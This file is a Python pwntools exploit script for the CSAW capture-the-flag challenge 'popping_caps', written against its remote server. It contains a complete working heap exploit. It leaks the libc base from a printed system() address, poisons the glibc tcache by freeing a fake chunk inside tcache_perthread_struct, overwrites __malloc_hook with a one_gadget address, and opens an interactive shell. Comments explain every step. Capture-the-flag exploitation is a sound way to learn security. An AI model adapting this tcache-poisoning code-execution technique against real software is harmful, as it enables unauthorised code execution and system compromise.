#!/usr/bin/env python2.7

import argparse
import os
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './popping_caps'
libc = './libc.so.6'
host = 'pwn.chal.csaw.io'
port = 1001

# ====================================================================
#   GLOBALS
# ====================================================================

T      = None      # The Target
LIBC   = None      # Libc ELF
BINARY = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        if not isinstance(self.tube, pwn.process):
            return  # Do not attach on remote

        run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid, terminal='tmux')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================

    def sendoption(self, option, delim, data, nl=True):
        self.sendlineafter('Your choice:', str(option))
        self.sendafter(delim, str(data) + '\n' if nl else str(data))

    def malloc(self, size):
        self.sendoption(1, 'How many:', size)

    def free(self, offset):
        self.sendoption(2, 'Whats in a free:', offset)

    def write(self, data):
        self.sendoption(3, 'Read me in:', data[:8], nl = (False if len(data) == 8 else True))


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BINARY = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    # Compute LIBC addresses
    T.recvuntil('system ')
    system = long(T.recvline(), 16)
    LIBC.address = system - LIBC.symbols['system']

    T.info('GLIBC base    : ' + hex(LIBC.address))
    T.info('system()      : ' + hex(system))
    T.info('__malloc_hook : ' + hex(LIBC.symbols['__malloc_hook']))

    # (1) call malloc to initialize tcache_perthread_struct, the size
    # is chosen to match the bin tcache->entries[57].
    # tcache_idx = (request2size(size) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
    T.malloc(0x3a8)

    # (2) free the chunk to increment the tcache->counts[57] to 1. This
    # will create a fake chunk of size 0x100 that will allow us to write
    # 8 bytes in the tcache->entries array.
    T.free(0)

    # (3) free the fake chunk (at offset -0x250 + 57 + 7) so it is placed
    # in it's tcache bin.
    # -0x250  - tcache_perthread_struct offset
    # +57     - tcache->counts[57]
    # +7      - point to user data
    T.free(-0x250 + 57 + 7)

    # (4) allocate 0xf8 bytes of memory. tcache will serve us a pointer
    # to the first bin.
    T.malloc(0xf8)

    # (5) write the address of __malloc_hook in the first tcache bin.
    T.write(pwn.p64(LIBC.symbols['__malloc_hook']))

    # (6) allocate 0x10 bytes to get the pointer in the fisrst bin
    # (__malloc_hook address).
    T.malloc(0x10)

    # (7) last cap! write the one_gadget address in __malloc_hook.
    T.write(pwn.p64(LIBC.address + 0x10a38c))

    T.clean()
    T.interactive()
